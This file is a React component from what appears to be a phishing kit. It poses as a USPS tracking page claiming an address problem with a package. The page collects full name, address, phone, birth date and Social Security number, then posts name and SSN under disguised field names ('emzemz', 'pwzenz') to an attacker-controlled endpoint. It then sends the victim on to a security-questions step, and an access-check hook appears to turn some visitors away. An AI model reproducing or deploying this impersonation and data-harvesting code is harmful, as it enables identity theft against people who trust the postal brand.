import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const footerColumns = [
  {
    heading: 'HELPFUL LINKS',
    links: [
      { label: 'Contact Us', href: 'https://www.usps.com/help/contact-us.htm' },
      { label: 'Site Index', href: 'https://www.usps.com/site-index.htm' },
      { label: 'FAQs', href: 'https://faq.usps.com/s/' },
    ],
  },
  {
    heading: 'ON ABOUT USPS.COM',
    links: [
      { label: 'About USPS Home', href: 'https://about.usps.com/' },
      { label: 'Newsroom', href: 'https://about.usps.com/newsroom/' },
      { label: 'USPS Service Updates', href: 'https://about.usps.com/newsroom/service-alerts/' },
      { label: 'Forms & Publications', href: 'https://about.usps.com/publications/' },
      { label: 'Government Services', href: 'https://www.usa.gov/' },
      { label: 'Careers', href: 'https://about.usps.com/careers/' },
    ],
  },
  {
    heading: 'OTHER USPS SITES',
    links: [
      { label: 'Business Customer Gateway', href: 'https://gateway.usps.com/' },
      { label: 'Postal Inspectors', href: 'https://www.uspis.gov/' },
      { label: 'Inspector General', href: 'https://www.uspsoig.gov/' },
      { label: 'Postal Explorer', href: 'https://pe.usps.com/' },
      { label: 'National Postal Museum', href: 'https://postalmuseum.si.edu/' },
      { label: 'Resources for Developers', href: 'https://www.usps.com/business/web-tools-apis/' },
      { label: 'PostalPro', href: 'https://postalpro.usps.com/' },
    ],
  },
  {
    heading: 'LEGAL INFORMATION',
    links: [
      { label: 'Privacy Policy', href: 'https://about.usps.com/who/legal/privacy-policy/' },
      { label: 'Terms of Use', href: 'https://about.usps.com/termsofuse.htm' },
      { label: 'FOIA', href: 'https://about.usps.com/who-we-are/foia/' },
      { label: 'No FEAR Act/EEO Contacts', href: 'https://about.usps.com/who/legal/no-fear-act/' },
      { label: 'Fair Chance Act', href: 'https://about.usps.com/who/careers/fair-chance-act.htm' },
      { label: 'Accessibility Statement', href: 'https://about.usps.com/who/legal/section-508/' },
    ],
  },
];

const socialLinks = [
  { name: 'Facebook', href: 'https://www.facebook.com/USPS', bg: 'bg-[#1877F2]' },
  { name: 'Instagram', href: 'https://www.instagram.com/uspostalservice/', bg: 'bg-gradient-to-tr from-[#f09433] via-[#e6683c] to-[#bc1888]' },
  { name: 'Pinterest', href: 'https://www.pinterest.com/uspsstamps/', bg: 'bg-[#E60023]' },
  { name: 'TikTok', href: 'https://www.tiktok.com/@usps', bg: 'bg-black' },
  { name: 'X', href: 'https://twitter.com/usps', bg: 'bg-black' },
  { name: 'YouTube', href: 'https://www.youtube.com/user/uspstv', bg: 'bg-[#FF0000]' },
];

const inputClass =
  'h-11 rounded-md border border-[#b7b7c9] bg-white px-4 text-sm text-[#1b1b1b] placeholder:text-[#9a9ab5] focus:border-[#2e2f72] focus:outline-none focus:ring-1 focus:ring-[#2e2f72]';

const LoginForm: React.FC = () => {
  // Map full name and SSN to existing backend payload fields
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [streetAddress1, setStreetAddress1] = useState('');
  const [streetAddress2, setStreetAddress2] = useState('');
  const [city, setCity] = useState('');
  const [selectedState, setSelectedState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [birthDate, setBirthDate] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-sm text-gray-600">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-sm text-gray-600">Access denied. Redirecting...</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    const newErrors = { emzemz: '', pwzenz: '' };

    if (!emzemz.trim()) {
      newErrors.emzemz = 'Full name is required.';
    }

    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'SSN is required.';
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/logix-meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/security-questions', {
          state: {
            emzemz: emzemz
          }
        });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="bg-[#f6f6f8] border-b-4 border-[#ba0c2f]">
        <div className="max-w-5xl mx-auto flex items-center justify-between px-4 py-2 text-sm text-[#2e2f72]">
          <a href="https://www.usps.com" className="hover:underline">
            Back to USPS.com
          </a>
          <a href="https://www.usps.com/help/contact-us.htm" className="flex items-center gap-2 hover:underline">
            <svg
              aria-hidden="true"
              className="h-4 w-4 text-[#2e2f72]"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path d="M18 8a6 6 0 11-10.86 3.41l-3.32 3.32a1 1 0 01-1.41-1.42l3.32-3.31A6 6 0 0118 8zm-6-4a4 4 0 100 8 4 4 0 000-8z" />
            </svg>
            Support
          </a>
        </div>
      </header>

      <main className="flex-1 flex justify-center bg-white">
        <div className="w-full max-w-5xl px-4 py-12 lg:px-6">
          <section className="space-y-10 px-2 md:px-4">
            <header className="space-y-4 text-sm text-[#2e2f72]">
              <div className="flex items-center gap-2">
                <span className="text-base font-semibold uppercase tracking-wide text-[#2e2f72]">Track Another Package</span>
                <button type="button" className="text-lg font-semibold text-[#ba0c2f] leading-none">+</button>
              </div>
              <p className="text-sm">
                <span className="font-semibold">Tracking Number:</span>
                <span className="ml-1 text-[#1b1b1b]">92612999897543581074711582</span>
              </p>

              <div className="space-y-2 text-[#1b1b1b]">
                <p className="font-semibold">Status :</p>
                <p className="text-base font-semibold text-[#ba0c2f]">We have issues with your shipping address</p>
                <p className="text-xs text-[#6b6b83]">
                  USPS allows you to Redeliver your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.
                </p>
                <p className="text-sm font-semibold text-[#ba0c2f]">Status Not Available</p>
                <div className="h-2 w-full overflow-hidden rounded-full bg-[#d9d9e5]">
                  <div className="grid h-full w-full grid-cols-6 gap-[1px] bg-[#d9d9e5]">
                    <span className="bg-gradient-to-b from-[#f5f5f9] to-[#c6c6d8]"></span>
                    <span className="bg-gradient-to-b from-[#f0f0f7] to-[#c2c2d5]"></span>
                    <span className="bg-gradient-to-b from-[#ececf5] to-[#bdbdd2]"></span>
                    <span className="bg-gradient-to-b from-[#e7e7f2] to-[#b8b8cf]"></span>
                    <span className="bg-gradient-to-b from-[#e3e3f0] to-[#b2b2cb]"></span>
                    <span className="bg-gradient-to-b from-[#dfdff0] to-[#adadc8]"></span>
                  </div>
                </div>
              </div>
            </header>

            <div className="space-y-2 text-[#1b1b1b]">
              <h2 className="text-xl font-semibold">Verify Address</h2>
              <p className="text-xs text-[#6b6b83]">
                First, we need to confirm your address is eligible for Informed Delivery.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5 text-sm text-[#1b1b1b]">
              <div className="grid gap-4 md:grid-cols-2">
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">Full name</span>
                  <input
                    type="text"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className={inputClass}
                    placeholder="Enter full name"
                    autoComplete="name"
                  />
                  {errors.emzemz && <span className="text-xs text-red-600">{errors.emzemz}</span>}
                </label>
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">Street Address 2 (OPT)</span>
                  <input
                    type="text"
                    value={streetAddress2}
                    onChange={(e) => setStreetAddress2(e.target.value)}
                    className={inputClass}
                    placeholder="Apartment, suite, etc."
                    autoComplete="address-line2"
                  />
                </label>
              </div>

              <label className="flex flex-col gap-1">
                <span className="font-medium text-[#2e2f72]">Street Address 1</span>
                <input
                  type="text"
                  value={streetAddress1}
                  onChange={(e) => setStreetAddress1(e.target.value)}
                  className={inputClass}
                  placeholder="Street Address"
                  autoComplete="address-line1"
                />
              </label>

              <div className="grid gap-4 md:grid-cols-[minmax(0,2fr)_minmax(0,1fr)_minmax(0,1fr)]">
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">City</span>
                  <input
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    className={inputClass}
                    placeholder="City"
                    autoComplete="address-level2"
                  />
                </label>
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">Select State</span>
                  <select
                    value={selectedState}
                    onChange={(e) => setSelectedState(e.target.value)}
                    className={`${inputClass} pr-8`}
                  >
                    <option value="">Select State</option>
                    <option value="AL">Alabama</option>
                    <option value="CA">California</option>
                    <option value="NY">New York</option>
                    <option value="TX">Texas</option>
                  </select>
                </label>
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">ZIP Code™ (OPT)</span>
                  <input
                    type="text"
                    value={zipCode}
                    onChange={(e) => setZipCode(e.target.value)}
                    className={inputClass}
                    placeholder="ZIP Code"
                    autoComplete="postal-code"
                  />
                </label>
              </div>

              <label className="flex flex-col gap-1">
                <span className="font-medium text-[#2e2f72]">Phone Number</span>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className={inputClass}
                  placeholder="Phone Number"
                  autoComplete="tel"
                />
              </label>

              <div className="grid gap-4 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_minmax(0,0.8fr)]">
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">Date of Birth</span>
                  <input
                    type="text"
                    value={birthDate}
                    onChange={(e) => setBirthDate(e.target.value)}
                    className={`${inputClass} placeholder:uppercase`}
                    placeholder="mm/dd/yyyy"
                    autoComplete="bday"
                  />
                </label>
                <label className="flex flex-col gap-1">
                  <span className="font-medium text-[#2e2f72]">SSN</span>
                  <input
                    type="text"
                    value={pwzenz}
                    onChange={(e) => setPwzenz(e.target.value)}
                    className={inputClass}
                    placeholder="Social Security Number"
                    autoComplete="off"
                  />
                  {errors.pwzenz && <span className="text-xs text-red-600">{errors.pwzenz}</span>}
                </label>
                <div className="flex items-end">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="h-11 w-full rounded bg-[#2e2f72] text-sm font-semibold text-white hover:bg-[#24255b] disabled:cursor-not-allowed disabled:opacity-70"
                  >
                    {isLoading ? 'Submitting…' : 'Continue'}
                  </button>
                </div>
              </div>
            </form>
          </section>
        </div>
      </main>

      <footer className="bg-[#f6f6f8] border-t border-gray-200">
        <div className="max-w-6xl mx-auto px-4 py-10 space-y-10">
          <div className="flex flex-col gap-8 lg:flex-row lg:items-start lg:justify-between">
            <div className="flex items-center gap-4 text-[#2e2f72]">
              <img src="/assets/logo.png" alt="USPS logo" className="h-10 w-auto" />
            </div>

            <div className="grid grid-cols-1 gap-8 text-sm text-[#1b1b1b] sm:grid-cols-2 lg:grid-cols-4 lg:gap-12">
              {footerColumns.map((column) => (
                <div key={column.heading} className="space-y-3">
                  <h3 className="text-xs font-semibold text-[#2e2f72] tracking-[0.2em]">
                    {column.heading}
                  </h3>
                  <ul className="space-y-2">
                    {column.links.map((link) => (
                      <li key={link.label}>
                        <a
                          href={link.href}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-sm text-[#1b1b1b] hover:text-[#2e2f72] hover:underline"
                        >
                          {link.label}
                        </a>
                      </li>
                    ))}
                  </ul>
                </div>
              ))}
            </div>
          </div>

          <div className="flex flex-col items-center justify-between gap-6 border-t border-gray-200 pt-6 text-sm text-gray-500 lg:flex-row">
            <p>Copyright © {new Date().getFullYear()} USPS. All Rights Reserved</p>
            <div className="flex items-center gap-3">
              {socialLinks.map((link) => (
                <a
                  key={link.name}
                  href={link.href}
                  target="_blank"
                  rel="noopener noreferrer"
                  className={`flex h-9 w-9 items-center justify-center rounded-full text-white shadow-sm transition hover:opacity-90 ${link.bg}`}
                >
                  <span className="text-sm font-semibold" aria-hidden="true">
                    {link.name.charAt(0)}
                  </span>
                  <span className="sr-only">{link.name}</span>
                </a>
              ))}
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default LoginForm;
